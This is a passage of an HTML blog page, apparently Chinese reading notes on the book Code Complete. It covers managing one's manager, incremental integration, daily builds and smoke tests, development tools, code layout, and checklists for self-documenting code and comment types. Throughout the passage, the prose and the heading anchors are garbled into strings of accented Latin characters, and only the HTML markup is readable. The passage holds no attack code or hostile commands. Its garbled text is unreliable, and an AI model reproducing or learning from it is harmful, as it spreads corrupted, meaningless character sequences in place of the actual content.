å¤©çš„è¿œç¨‹åŠå…¬ï¼Œæ—¢å¯ä»¥èŠ‚çœä¸Šä¸‹ç­æ—¶é—´ï¼Œåˆå¯ä»¥æå‡å‘˜å·¥çš„å¹¸ç¦æ„Ÿã€‚å¦‚æœå®Œå…¨è¿œç¨‹åŠå…¬ï¼Œåˆ™ä¼šå¯¼è‡´å›¢é˜Ÿåä½œæ•ˆç‡ä½ä¸‹ï¼Œå›¢é˜Ÿæ°›å›´å·®ç­‰é—®é¢˜ã€‚</p></blockquote><blockquote><p>å…³äºå¼€æ”¾å¼åŠå…¬ä¸æ ¼å­é—´åŠå…¬çš„ä¸€äº›è®¨è®ºï¼šå¼€æ”¾å¼åŠå…¬å¯¼è‡´å™ªéŸ³æ±¡æŸ“ä¸è§†è§‰æ··ä¹±ï¼Œæ— æ³•é›†ä¸­æ³¨æ„åŠ›ã€å½±å“ç‹¬ç«‹æ€è€ƒï¼Œä»¥åŠå‰¥å¤ºéšç§ç­‰é—®é¢˜ã€‚çœŸæ­£ä¾¿äºå‘˜å·¥åˆ›é€ ä»·å€¼çš„è®¾è®¡åœ¨äºç©ºé—´çš„â€œå¯é€‰æ‹©æ€§â€ï¼Œå³èµ‹äºˆå‘˜å·¥æ›´å¤šçš„è‡ªä¸»é€‰æ‹©æƒã€‚å‘˜å·¥å¯ä»¥åœ¨ä¸åŒç±»å‹çš„åŠŸèƒ½åŒºå†…é€‰æ‹©é€‚åˆè‡ªå·±å·¥ä½œæ–¹å¼çš„ä½ç½®ï¼Œéœ€è¦é™ä¸‹å¿ƒæ¥å·¥ä½œæ—¶å¯ä»¥ç‹¬è¾Ÿä¸€ä¸ªåŒºåŸŸåŠå…¬ï¼Œéœ€è¦æ²Ÿé€šåˆä½œæ—¶å›´ååœ¨ä¸€èµ·ååŒå·¥ä½œã€‚</p></blockquote><h3 id="ç®¡ç†ä½ çš„ç®¡ç†è€…"><a href="#ç®¡ç†ä½ çš„ç®¡ç†è€…" class="headerlink" title="ç®¡ç†ä½ çš„ç®¡ç†è€…"></a>ç®¡ç†ä½ çš„ç®¡ç†è€…</h3><p>åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼ŒéæŠ€æœ¯å‡ºèº«çš„ç®¡ç†è€…éšå¤„å¯è§ï¼Œå…·æœ‰æŠ€æœ¯ç»éªŒä½†å´è½åäºè¿™ä¸ªæ—¶ä»£åå¹´ä»¥ä¸Šçš„ç®¡ç†è€…ä¹Ÿæ¯”æ¯”çš†æ˜¯ã€‚æŠ€æœ¯å‡ºè‰²å¹¶ä¸”å…¶æŠ€æœ¯ä¸æ—¶ä¿±è¿›çš„ç®¡ç†è€…å®å±å‡¤æ¯›éºŸè§’ã€‚å¦‚æœä½ æ­£åœ¨ä¸ºä¸€ä½è¿™æ ·çš„ç®¡ç†è€…å·¥ä½œï¼Œé‚£ä¹ˆå°±å°½å¯èƒ½åœ°ä¿ä½ä½ çš„å·¥ä½œå§ã€‚è¿™å¯æ˜¯éå¸¸éš¾å¾—çš„å¾…é‡ã€‚</p><p>å¦‚æœä½ çš„ç®¡ç†è€…æ˜¯å¾ˆå…¸å‹çš„é‚£ç§ï¼Œé‚£ä¹ˆä½ å°†ä¸å¾—ä¸è‚©è´Ÿä¸€é¡¹ä¸å€¼å¾—ç¾¡æ…•çš„è´£ä»»â€”â€”ç®¡ç†ä½ çš„ç®¡ç†è€…ã€‚â€œç®¡ç†ä½ çš„ç®¡ç†è€…â€æ„å‘³ç€ï¼Œä½ éœ€è¦å‘Šè¯‰ä»–åº”è¯¥è¿™æ ·åšè€Œä¸åº”è¯¥é‚£æ ·åšã€‚å…¶è¦è¯€åœ¨äºï¼Œä½ è¦è¡¨ç°å¾—ä½¿ä½ çš„ç®¡ç†è€…è®¤ä¸ºä»–ä»ç„¶åœ¨ç®¡ç†ä½ ã€‚<br>ä¸‹é¢å°±æ˜¯ä¸€äº›åº”å¯¹ç®¡ç†è€…çš„æ–¹æ³•:</p><ul><li>æŠŠä½ å¸Œæœ›åšä»€ä¹ˆçš„å¿µå¤´å…ˆè—èµ·æ¥ï¼Œç­‰ç€ä½ çš„ç®¡ç†è€…ç»„ç»‡ä¸€åœºæœ‰å…³ä½ çš„æƒ³æ³•çš„å¤´è„‘é£æš´é›†ä½“è®¨è®ºã€‚</li><li>æŠŠåšäº‹æƒ…çš„æ­£ç¡®æ–¹æ³•ä¼ æˆç»™ä½ çš„ç®¡ç†è€…ã€‚è¿™æ˜¯ä¸€é¡¹éœ€è¦æŒä¹‹ä»¥æ’çš„å·¥ä½œï¼Œå› ä¸ºç®¡ç†äººå‘˜ç»å¸¸ä¼šè¢«æå‡ã€è°ƒè¿æˆ–è€…è§£è˜ã€‚</li><li>å…³æ³¨ä½ çš„ç®¡ç†è€…çš„å…´è¶£ï¼ŒæŒ‰ç…§ä»–çš„çœŸæ­£æ„å›¾å»åšï¼Œè€Œä¸è¦ç”¨äº›ä¸å¿…è¦çš„å®ç°ç»†èŠ‚æ¥åˆ†æ•£å…¶æ³¨æ„åŠ›ã€‚(è¯·æŠŠå®ƒè®¾æƒ³æˆæ˜¯å¯¹ä½ å·¥ä½œçš„ä¸€ç§â€œå°è£…â€ã€‚)</li><li>æ‹’ç»æŒ‰ç…§ä½ çš„ç®¡ç†è€…æ‰€è¯´çš„å»åšï¼ŒåšæŒç”¨æ­£ç¡®çš„æ–¹æ³•åšè‡ªå·±çš„äº‹ã€‚</li><li>æ¢å·¥ä½œã€‚<br>æœ€ä½³çš„é•¿è¿œçš„è§£å†³æ–¹æ¡ˆæ˜¯æ•™è‚²ä½ çš„ç®¡ç†è€…ã€‚è¿™æ ·åšé€šå¸¸å¾ˆéš¾ï¼Œä½†æ˜¯ä½ å¯ä»¥é€šè¿‡é˜…è¯»å¡å†…åŸºçš„ã€Šäººæ€§çš„å¼±ç‚¹ã€‹ä¸€ä¹¦æ¥åšå¥½å¿…è¦çš„å‡†å¤‡ã€‚</li></ul><h2 id="ç¬¬29ç« -é›†æˆ"><a href="#ç¬¬29ç« -é›†æˆ" class="headerlink" title="ç¬¬29ç«  é›†æˆ"></a>ç¬¬29ç«  é›†æˆ</h2><h3 id="ä»é›†æˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ï¼š"><a href="#ä»é›†æˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ï¼š" class="headerlink" title="ä»é›†æˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ï¼š"></a>ä»é›†æˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ï¼š</h3><ul><li>æ›´å®¹æ˜“è¯Šæ–­ç¼ºé™·</li><li>ç¼ºé™·æ›´å°‘</li><li>è„šæ‰‹æ¶æ›´å°‘</li><li>èŠ±è´¹æ›´å°‘çš„æ—¶é—´è·å¾—ç¬¬ä¸€ä¸ªèƒ½å·¥ä½œçš„äº§å“</li><li>æ›´çŸ­çš„æ•´ä½“å¼€å‘è¿›åº¦è¡¨</li><li>æ›´å¥½çš„é¡¾å®¢å…³ç³»</li><li>å¢å¼ºå£«æ°”</li><li>å¢åŠ é¡¹ç›®å®Œæˆçš„æœºä¼š</li><li>æ›´å¯é åœ°ä¼°è®¡è¿›åº¦è¡¨</li><li>æ›´å‡†ç¡®çš„ç°çŠ¶æŠ¥å‘Š</li><li>æ”¹å–„ä»£ç è´¨é‡</li><li>è¾ƒå°‘çš„æ–‡æ¡£</li></ul><h3 id="å¢é‡é›†æˆçš„ç›Šå¤„"><a href="#å¢é‡é›†æˆçš„ç›Šå¤„" class="headerlink" title="å¢é‡é›†æˆçš„ç›Šå¤„"></a>å¢é‡é›†æˆçš„ç›Šå¤„</h3><ul><li>æ˜“äºå®šä½é”™è¯¯</li><li>åŠæ—©åœ¨é¡¹ç›®é‡Œå–å¾—ç³»ç»Ÿçº§çš„æˆæœ</li><li>æ”¹å–„å¯¹è¿›åº¦çš„ç›‘æ§</li><li>æ”¹å–„å®¢æˆ·å…³ç³»ã€‚å®¢æˆ·å–œæ¬¢çœ‹åˆ°äº§å“åœ¨ä¸€ç‚¹ç‚¹çš„å‰è¿›</li><li>æ›´åŠ å……åˆ†åœ°æµ‹è¯•ç³»ç»Ÿä¸­çš„å„ä¸ªå•å…ƒ</li><li>èƒ½åœ¨æ›´çŸ­çš„å¼€å‘è¿›åº¦è®¡åˆ’å†…æ„é€ å‡ºæ•´ä¸ªç³»ç»Ÿ</li></ul><h3 id="æ¯æ—¥æ„å»ºä¸å†’çƒŸæµ‹è¯•"><a href="#æ¯æ—¥æ„å»ºä¸å†’çƒŸæµ‹è¯•" class="headerlink" title="æ¯æ—¥æ„å»ºä¸å†’çƒŸæµ‹è¯•"></a>æ¯æ—¥æ„å»ºä¸å†’çƒŸæµ‹è¯•</h3><ul><li>é¡¹ç›®éœ€è¦æ¯æ—¥æ„å»ºã€‚å¯ä»¥å°†æ¯æ—¥æ„å»ºè§†ä¸ºé¡¹ç›®çš„è„‰æã€‚</li><li>æ£€æŸ¥å¤±è´¥çš„æ„å»º</li><li>æ¯å¤©è¿›è¡Œå†’çƒŸæµ‹è¯•ã€‚å†’çƒŸæµ‹è¯•åº”è¯¥ä»å¤´åˆ°å°¾æ¼”ç»ƒæ•´ä¸ªç³»ç»Ÿã€‚å®ƒä¸å¿…åšåˆ°æ¯«æ— é—æ¼ï¼Œä½†æ˜¯åº”è¯¥èƒ½å¤Ÿæš´éœ²ä¸»è¦é—®é¢˜ã€‚å†’çƒŸæµ‹è¯•åº”è¯¥è¶³å¤Ÿå½»åº•ï¼šå¦‚æœè¿™ä¸€æ„å»ºé€šè¿‡äº†æµ‹è¯•ï¼Œé‚£ä¹ˆå°±èƒ½å‡å®šå®ƒå·²ç»è¶³å¤Ÿç¨³å®šï¼Œå¯ä»¥æ¥å—æ›´åŠ å½»åº•çš„æµ‹è¯•äº†ã€‚</li><li>è®©å†’çƒŸæµ‹è¯•ä¸æ—¶ä¿±è¿›ã€‚éšç€ç³»ç»Ÿçš„å¼€å‘ï¼Œå†’çƒŸæµ‹è¯•å˜å¾—æ›´åŠ å½»åº•ã€‚</li><li>å°†æ¯æ—¥æ„å»ºä¸å†’çƒŸæµ‹è¯•è‡ªåŠ¨åŒ–</li><li>æˆç«‹æ„å»ºå°ç»„</li><li>ä»…å½“æœ‰æ„ä¹‰æ—¶ï¼Œæ‰å°†ä¿®è®¢åŠ å…¥æ„å»ºä¸­</li><li>ä½†åˆ«ç­‰å¤ªä¹…æ‰å°†ä¿®è®¢åŠ å…¥è¿›æ¥ã€‚å¦‚æœæŸä¸ªå¼€å‘äººå‘˜æ¥è¿ä¸¤ä¸‰å¤©éƒ½ä¸checkinä»–åšçš„æ”¹åŠ¨ï¼Œé‚£ä¹ˆè¿™åå¼€å‘äººå‘˜æ‰€åšçš„å·¥ä½œå°±æ˜¯æœ‰é£é™©çš„ã€‚é¢‘ç¹çš„é›†æˆæœ‰æ—¶è¿«ä½¿ä½ å°†å•ä¸€åŠŸèƒ½çš„æ„å»ºåˆ†ä¸ºè‹¥å¹²é˜¶æ®µè¿›è¡Œã€‚è¿™ä¸€é¢å¤–å¼€é”€æ˜¯å¯æ¥å—çš„ï¼Œæ˜¯ä¸ºâ€œå‡å°é›†æˆçš„é£é™©ã€æ”¹å–„é¡¹ç›®çŠ¶å†µçš„èƒ½è§åº¦ã€æ”¹å–„å¯æµ‹è¯•æ€§ï¼Œä»¥åŠé¢‘ç¹é›†æˆçš„å…¶ä»–ç›Šå¤„â€è€Œä»˜å‡ºçš„ä»£ä»·ã€‚</li><li>è¦æ±‚å¼€å‘äººå‘˜åœ¨æŠŠä»–çš„ä»£ç æ·»åŠ åˆ°ç³»ç»Ÿä¹‹å‰ï¼Œè¿›è¡Œå†’çƒŸæµ‹è¯•</li><li>ä¸ºå³å°†æ·»åŠ åˆ°æ„å»ºçš„ä»£ç å‡†å¤‡ä¸€å—æš‚å­˜åŒºã€‚â€œæ¯æ—¥æ„å»ºè¿‡ç¨‹çš„æˆåŠŸâ€éƒ¨åˆ†å–å†³äºâ€œçŸ¥æ™“å“ªäº›æ„å»ºæ˜¯å¥½çš„ï¼Œå“ªäº›æ˜¯åçš„â€ã€‚åœ¨æµ‹è¯•è‡ªå·±çš„ä»£ç æ—¶ï¼Œå¼€å‘äººå‘˜éœ€è¦ä¾èµ–â€œå¥½çš„ç³»ç»Ÿâ€ã€‚å¤§å¤šæ•°å›¢é˜Ÿè§£å†³è¿™ä¸ªé—®é¢˜çš„åŠæ³•æ˜¯ï¼Œä¸ºå¼€å‘äººå‘˜è®¤ä¸ºâ€œå·²å‡†å¤‡å¥½æ·»åŠ åˆ°æ„å»ºä¸­â€çš„ä»£ç å‡†å¤‡ä¸€å—æš‚å­˜åŒºã€‚æ–°çš„ä»£ç è¿›å…¥æš‚å­˜åŒºï¼Œæ„å»ºå‡ºæ–°çš„æ„å»ºï¼Œå¦‚æœæ–°çš„æ„å»ºæ˜¯å¯æ¥å—çš„ï¼Œé‚£ä¹ˆå°†æ–°çš„ä»£ç åˆå¹¶åˆ°ä¸»æºç ä¸­ã€‚åœ¨å°å‹å’Œä¸­å‹é¡¹ç›®ä¸­ï¼Œç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿå¯æä¾›è¿™ä¸€åŠŸèƒ½ã€‚å¼€å‘äººå‘˜å°†æ–°çš„ä»£ç check inåˆ°ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸­ã€‚å¯¹äºé‚£äº›æƒ³è¦ä½¿ç”¨å·²çŸ¥æ˜¯å¥½çš„æ„å»ºçš„å¼€å‘äººå‘˜ï¼Œä»–ä»¬åªéœ€åœ¨checkoutæ–‡ä»¶æ—¶è®¾ç½®ä¸€ä¸ªæ—¥æœŸé€‰é¡¹ï¼Œè®©ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ ¹æ®æ‰€è®¾æ—¥æœŸå–å›ä¸Šæ¬¡çš„å¥½çš„æ„å»ºã€‚</li><li>æƒ©ç½šç ´åæ„å»ºçš„äºº</li><li>åœ¨æ—©ä¸Šå‘å¸ƒæ„å»ºã€‚è¿™æ ·å¯ä»¥åœ¨å·¥ä½œæ—¶é—´å¤„ç†æ„å»ºä¸­å‘ç°çš„é—®é¢˜ï¼Œé¿å…åŠ ç­æ—¶ç›¸å…³äººå‘˜ä¸åœ¨ï¼Œæˆ–è€…åŒ†å¿™è§£å†³é—®é¢˜ã€‚</li><li>å³ä½¿æœ‰å‹åŠ›,ä¹Ÿè¦è¿›è¡Œæ¯æ—¥æ„å»ºå’Œå†’çƒŸæµ‹è¯•ã€‚å½“è¿›åº¦å‹åŠ›å˜å¤§æ—¶ï¼Œç»´æŠ¤æ¯æ—¥æ„å»ºæ‰€éœ€çš„å·¥ä½œçœ‹èµ·æ¥å°±åƒæ˜¯å¥¢ä¾ˆçš„é¢å¤–å¼€é”€äº†ã€‚å…¶å®ç›¸åçš„è§‚ç‚¹æ‰æ˜¯å¯¹çš„ã€‚æ¯æ—¥æ„å»ºå¼ºè°ƒäº†çºªå¾‹ï¼Œå¹¶è®©å¤„äºé«˜å‹é”…é‡Œçš„é¡¹ç›®ä¸å‡ºè½¨ã€‚ä»£ç ä»ç„¶ä¼šæœ‰å˜æ··ä¹±çš„å€¾å‘ï¼Œä¸è¿‡æ„å»ºè¿‡ç¨‹æ¯å¤©éƒ½åœ¨æŠŠè¿™ç§å€¾å‘æ‹‰å›æ¥ã€‚</li></ul><p>é¡¹ç›®è¶Šå¤§ï¼Œå¢é‡é›†æˆè¶Šé‡è¦ã€‚</p><h2 id="ç¬¬30ç« -å¼€å‘å·¥å…·"><a href="#ç¬¬30ç« -å¼€å‘å·¥å…·" class="headerlink" title="ç¬¬30ç«  å¼€å‘å·¥å…·"></a>ç¬¬30ç«  å¼€å‘å·¥å…·</h2><p>ç¼–ç¨‹æœªæ¥ä¼šè¢« AI æ›¿ä»£å—ï¼Ÿ<br>ç­”æ¡ˆæ˜¯ä¸ä¼šçš„ã€‚å› ä¸ºç¼–ç¨‹ä»æ ¹æœ¬ä¸Šè¯´å°±æ˜¯å›°éš¾çš„â€”â€”å³ä¾¿æœ‰å¥½çš„å·¥å…·æ”¯æ´ã€‚ æ— è®ºèƒ½ç”¨åˆ°å“ªäº›å·¥å…·ï¼Œç¨‹åºå‘˜éƒ½å¿…é¡»ä¸å‡Œä¹±çš„çœŸå®ä¸–ç•Œè¾ƒåŠ›ï¼›æˆ‘ä»¬é¡»å¾—ä¸¥å¯†åœ°æ€è€ƒå‰åæ¬¡åºã€ä¾èµ–å…³ç³»ã€å¼‚å¸¸æƒ…å†µï¼›è€Œä¸”æˆ‘ä»¬è¿˜è¦ä¸æ— æ³•è¯´æ¸…æ¥šè‡ªå·±æƒ³æ³•çš„æœ€ç»ˆç”¨æˆ·äº¤å¾€ã€‚æˆ‘ä»¬å§‹ç»ˆè¦åº”å¯¹è¿æ¥åˆ°å…¶ä»–è½¯ä»¶æˆ–ç¡¬ä»¶çš„å®šä¹‰ä¸æ¸…çš„æ¥å£ï¼Œè¿˜è¦è§£å†³è§„ç« åˆ¶åº¦ã€ä¸šåŠ¡è§„åˆ™ä»¥åŠå…¶ä»–å¤æ‚æ€§ä¹‹æºï¼Œè¿™äº›å¤æ‚æ€§æ¥è‡ªè®¡ç®—æœºç¼–ç¨‹ä¹‹å¤–çš„ä¸–ç•Œã€‚</p><h2 id="ç¬¬31ç« -å¸ƒå±€ä¸é£æ ¼"><a href="#ç¬¬31ç« -å¸ƒå±€ä¸é£æ ¼" class="headerlink" title="ç¬¬31ç«  å¸ƒå±€ä¸é£æ ¼"></a>ç¬¬31ç«  å¸ƒå±€ä¸é£æ ¼</h2><p>å®é™…ä¸Šï¼Œç€é‡é€»è¾‘è¡¨ç°é€šå¸¸å¹¶ä¸ä¼šåšå‡ºéš¾çœ‹çš„ä»£ç â€”â€”é™¤éä»£ç çš„é€»è¾‘åŸæœ¬å°±å¾ˆä¸‘é™‹ã€‚</p><p>ç¼–ç¨‹å·¥ä½œé‡çš„ä¸€å°éƒ¨åˆ†æ˜¯å†™è®©æœºå™¨è¯»çš„ç¨‹åºï¼Œå¤§éƒ¨åˆ†å·¥ä½œæ˜¯å†™èƒ½è®©ä»–äººçœ‹æ‡‚çš„ç¨‹åºã€‚</p><p>ä½ æ— æ³•æƒ³è±¡ä¼šæœ‰è¿™æ ·ä¸€æœ¬ä¹¦ï¼šå…¶ä¸­æ²¡æœ‰ç©ºæ ¼éš”å¼€å•è¯ï¼Œä¸åˆ†æ®µè½ï¼Œä¹Ÿæ²¡æœ‰ç« èŠ‚ä¹‹åˆ†ã€‚è¿™æ ·çš„ä¹¦æˆ–è®¸ä»å¤´è‡³å°¾è¿˜æ˜¯å¯ä»¥è¯»çš„ï¼Œä½†å‡ ä¹ä¸å¯èƒ½ç¿»é˜…å»æ‰¾åˆ°æŸä¸ªå…³é”®å¥ï¼Œæˆ–è€…å®šä½æŸä¸ªé‡è¦çš„æ®µè½ã€‚æ›´è‡´å‘½çš„å¤§æ¦‚æ˜¯ï¼Œä¹¦çš„è¿™ç§å¸ƒå±€ä¸èƒ½å¯¹è¯»è€…å±•ç¤ºä½œè€…æ‰“ç®—å¦‚ä½•ç»„ç»‡ä¿¡æ¯ï¼Œè€Œä½œè€…çš„ç»„ç»‡æ–¹æ³•æ­£æ˜¯ç†è§£æœ‰å…³ä¸»é¢˜é€»è¾‘ç»“æ„çš„æœ€é‡è¦çº¿ç´¢ã€‚<br>å°†ä¹¦åˆ†æˆä¸€äº›ç« èŠ‚ã€æ®µè½ä»¥åŠå¥å­ï¼Œå°±å‘è¯»è€…å±•ç°å‡ºäº†ä½œè€…ç»„ç»‡ä¸»é¢˜çš„æ€è·¯ã€‚å¦‚æœè¿™ä¸€ç»„ç»‡ä¸å¤Ÿæ˜ç¡®ï¼Œè¯»è€…å°±å¿…é¡»è‡ªå·±å»æ‘¸ç´¢ï¼Œè¿™å°†æå¤§åœ°å¢åŠ è¯»è€…çš„è´Ÿæ‹…ï¼Œæˆ–è®¸ä»–ä»¬è‡ªå§‹è‡³ç»ˆéƒ½æ— æ³•ææ¸…æœ‰å…³ä¸»é¢˜çš„ç»„ç»‡æ–¹å¼ã€‚<br>ç¨‹åºé‡ŒåŒ…å«çš„ä¿¡æ¯å¯†åº¦è¶…è¿‡å¤šæ•°ä¹¦ç±é‡Œçš„ä¿¡æ¯å¯†åº¦ã€‚ä½ ä¹Ÿè®¸ä¸€ä¸¤åˆ†é’Ÿå°±èƒ½è¯»å®Œå¹¶ç†è§£ä¹¦çš„ä¸€é¡µå†…å®¹ï¼Œå¤§éƒ¨åˆ†ç¨‹åºå‘˜å´ä¸èƒ½ä»¥ç±»ä¼¼çš„é€Ÿåº¦çœ‹æ‡‚æœªç»ä¿®é¥°çš„ç¨‹åºä»£ç æ¸…å•ã€‚ç¨‹åºåº”è¯¥æ¯”ä¹¦æä¾›æ›´å¤šçš„ç»„ç»‡çº¿ç´¢ï¼Œè€Œä¸æ˜¯ç›¸åã€‚</p><h2 id="ç¬¬32ç« -è‡ªè¯´æ˜ä»£ç "><a href="#ç¬¬32ç« -è‡ªè¯´æ˜ä»£ç " class="headerlink" title="ç¬¬32ç«  è‡ªè¯´æ˜ä»£ç "></a>ç¬¬32ç«  è‡ªè¯´æ˜ä»£ç </h2><p>å¯¹äºç²¾å¿ƒç¼–å†™çš„ä»£ç è€Œè¨€ï¼Œæ³¨é‡Šä¸è¿‡æ˜¯ç¾ä¸½è¡£è£³å¤–çš„å°é¥°ç‰©è€Œå·²ã€‚</p><p>ç±»</p><ul><li>ä½ çš„ç±»æ¥å£ä½“ç°å‡ºæŸç§ä¸€è‡´çš„æŠ½è±¡å—?</li><li>ä½ çš„ç±»åæœ‰æ„ä¹‰å—ï¼Œèƒ½è¡¨æ˜å…¶ä¸­å¿ƒæ„å›¾å—?</li><li>ä½ çš„ç±»æ¥å£å¯¹äºå¦‚ä½•ä½¿ç”¨è¯¥ç±»æ˜¾è€Œæ˜“è§å—?</li><li>ä½ çš„ç±»æ¥å£èƒ½æŠ½è±¡åˆ°ä¸éœ€è€ƒè™‘å…¶å®ç°è¿‡ç¨‹å—?èƒ½æŠŠç±»çœ‹æˆæ˜¯é»‘ç›’å—?</li></ul><p>å­ç¨‹åº</p><ul><li>ä½ çš„æ¯ä¸ªå­ç¨‹åºåéƒ½èƒ½å‡†ç¡®åœ°æŒ‡ç¤ºè¯¥å­ç¨‹åºç¡®åˆ‡å¹²äº›ä»€ä¹ˆå—?</li><li>ä½ çš„å„å­ç¨‹åºçš„ä»»åŠ¡æ˜ç¡®å—?</li><li>è‹¥å„å­ç¨‹åºä¸­è‡ªæˆä¸€ä½“åæ›´æœ‰ç”¨ï¼Œä½ éƒ½å°†å…¶å„è‡ªç‹¬ç«‹å‡ºæ¥äº†å—?</li><li>æ¯ä¸ªå­ç¨‹åºçš„æ¥å£éƒ½æ¸…æ™°æ˜äº†å—?</li></ul><p>æ•°æ®å</p><ul><li>ç±»å‹åæè¿°æœ‰åŠ©äºè¯´æ˜æ•°æ®å£°æ˜å—?</li><li>ä½ çš„å˜é‡åæœ‰æ„ä¹‰å—?</li><li>å˜é‡åªç”¨åœ¨å…¶åå­—æ‰€ä»£è¡¨æ„ä¹‰çš„åœºåˆå—?</li><li>ä½ çš„å¾ªç¯å˜é‡åèƒ½ç»™å‡ºæ›´å¤šä¿¡æ¯ï¼Œè€Œä¸æ˜¯iã€jã€kä¹‹ç±»çš„å—?</li><li>ä½ ç”¨äº†åå­—æœ‰æ„ä¹‰çš„æšä¸¾ç±»å‹ï¼Œè€Œéä¸´æ—¶æ‹¼å‡‘çš„æ ‡è¯†æˆ–è€…å¸ƒå°”å˜é‡å—?</li><li>ç”¨å…·åå¸¸é‡ä»£æ›¿ç¥ç§˜æ•°å€¼æˆ–è€…å­—ç¬¦ä¸²äº†å—?</li><li>ä½ çš„å‘½åè§„èŒƒèƒ½åŒºåˆ†ç±»å‹åã€æšä¸¾ç±»å‹ã€å…·åå¸¸é‡ã€å±€éƒ¨å˜é‡ã€ç±»å˜é‡ä»¥åŠå…¨å±€å˜é‡å—?</li></ul><p>æ•°æ®ç»„ç»‡</p><ul><li>ä½ æ ¹æ®ç¼–ç¨‹æ¸…æ™°çš„éœ€è¦ï¼Œä½¿ç”¨äº†é¢å¤–å˜é‡æ¥æé«˜æ¸…æ™°åº¦å—?</li><li>ä½ å¯¹æŸå˜é‡çš„å¼•ç”¨é›†ä¸­å—?</li><li>æ•°æ®ç±»å‹ç®€åŒ–åˆ°äº†æœ€ä½å¤æ‚åº¦å—?</li><li>ä½ æ˜¯é€šè¿‡æŠ½è±¡è®¿é—®å­ç¨‹åº(æŠ½è±¡æ•°æ®ç±»å‹)æ¥è®¿é—®å¤æ‚æ•°æ®å—?</li></ul><p>æ§åˆ¶</p><ul><li>ä»£ç ä¸­çš„æ­£å¸¸æ‰§è¡Œè·¯å¾„å¾ˆæ¸…æ™°å—?</li><li>ç›¸å…³è¯­å¥æ”¾åœ¨ä¸€èµ·äº†å—?</li><li>ç›¸å¯¹ç‹¬ç«‹çš„è¯­å¥ç»„æ‰“åŒ…ä¸ºå­ç¨‹åºäº†å—?</li><li>æ­£å¸¸æƒ…å†µçš„å¤„ç†ä½äºifè¯­å¥ä¹‹åï¼Œè€Œéåœ¨elseå­å¥ä¸­å—?</li><li>æ§åˆ¶ç»“æ„ç®€å•æ˜äº†ï¼Œä»¥ä½¿å¤æ‚åº¦æœ€ä½å—?</li><li>æ¯ä¸ªå¾ªç¯å®Œæˆä¸”ä»…å®Œæˆä¸€ä¸ªåŠŸèƒ½ï¼Œæ˜¯åƒå®šä¹‰è‰¯å¥½çš„å­ç¨‹åºé‚£ä¹ˆåšå—?</li><li>åµŒå¥—å±‚æ¬¡æ˜¯æœ€å°‘å—?</li><li>é€»è¾‘è¡¨è¾¾å¼é€šè¿‡é¢å¤–æ·»åŠ å¸ƒå°”å˜é‡ã€å¸ƒå°”å‡½æ•°å’ŒåŠŸèƒ½è¡¨ç®€åŒ–äº†å—? </li></ul><p>å¸ƒå±€</p><ul><li>ç¨‹åºçš„å¸ƒå±€èƒ½è¡¨ç°å‡ºå…¶é€»è¾‘ç»“æ„å—?</li></ul><p>è®¾è®¡</p><ul><li>ä»£ç ç›´æˆªäº†å½“å—?æ˜¯ä¸æ˜¯é¿å…äº†è‡ªä½œèªæ˜æˆ–æ–°èŠ±æ ·?</li><li>å®ç°ç»†èŠ‚å°½å¯èƒ½éšè—äº†å—?</li><li>ç¨‹åºæ˜¯å°½å¯èƒ½é‡‡ç”¨é—®é¢˜é¢†åŸŸçš„æœ¯è¯­ï¼Œè€ŒéæŒ‰ç…§è®¡ç®—æœºç§‘å­¦æˆ–è€…ç¼–ç¨‹è¯­è¨€çš„æœ¯è¯­ç¼–å†™çš„å—?</li></ul><h3 id="æ³¨é‡Šçš„ç§ç±»"><a href="#æ³¨é‡Šçš„ç§ç±»" class="headerlink" title="æ³¨é‡Šçš„ç§ç±»"></a>æ³¨é‡Šçš„ç§ç±»</h3><ul><li>é‡å¤ä»£ç ã€‚é‡å¤æ€§æ³¨é‡Šåªæ˜¯ç”¨ä¸åŒæ–‡å­—æŠŠä»£ç çš„å·¥ä½œåˆæè¿°ä¸€æ¬¡ã€‚å®ƒé™¤äº†ç»™è¯»è€…å¢åŠ é˜…è¯»é‡å¤–ï¼Œæ²¡æœ‰æä¾›æ›´å¤šä¿¡æ¯ã€‚</li><li>è§£é‡Šä»£ç ã€‚è§£é‡Šæ€§æ³¨é‡Šé€šå¸¸ç”¨äºè§£é‡Šå¤æ‚ã€æ•æ„Ÿçš„ä»£ç å—ã€‚åœ¨è¿™äº›åœºåˆå®ƒä»¬èƒ½æ´¾ä¸Šç”¨åœºï¼Œä½†é€šå¸¸æ­£æ˜¯å› ä¸ºä»£ç å«æ··ä¸æ¸…ï¼Œæ‰ä½“ç°å‡ºè¿™ç±»æ³¨é‡Šçš„ä»·å€¼ã€‚<strong>å¦‚æœä»£ç è¿‡äºå¤æ‚è€Œéœ€è¦è§£é‡Šï¼Œæœ€å¥½æ˜¯æ”¹è¿›ä»£ç ï¼Œè€Œä¸æ˜¯æ·»åŠ æ³¨é‡Š</strong>ã€‚ä½¿ä»£ç æ¸…æ™°åå†ç”¨æ¦‚è¿°æ€§æ³¨é‡Šæˆ–è€…æ„å›¾æ€§æ³¨é‡Šã€‚</li><li>ä»£ç æ ‡è®°ã€‚ç”¨äºæé†’å¼€å‘è€…æŸå¤„çš„å·¥ä½œæœªåšå®Œæˆ–è€…æŸäº›æ³¨æ„äº‹é¡¹ï¼Œå¦‚TODOã€‚ä»£ç æ ‡è®°æœ€å¥½æœ‰ç»Ÿä¸€çš„é£æ ¼ï¼Œä»¥ä¾¿åæœŸç»Ÿä¸€æ£€ç´¢å¤„ç†ã€‚</li><li>æ¦‚è¿°ä»£ç ã€‚å°†è‹¥å¹²ä»£ç è¡Œçš„æ„æ€ä»¥ä¸€ä¸¤å¥è¯è¯´å‡ºæ¥ã€‚è¿™ç§æ³¨é‡Šæ¯”é‡å¤æ€§æ³¨é‡Šå¼ºå¤šäº†ï¼Œå› ä¸ºè¯»è€…è¯»æ³¨é‡Šèƒ½æ¯”è¯»ä»£ç æ›´å¿«ã€‚æ¦‚è¿°æ€§æ³¨é‡Šå¯¹äºè¦ä¿®æ”¹ä½ ä»£ç çš„å…¶ä»–äººæ¥è¯´å°¤å…¶æœ‰ç”¨ã€‚</li><li>ä»£ç 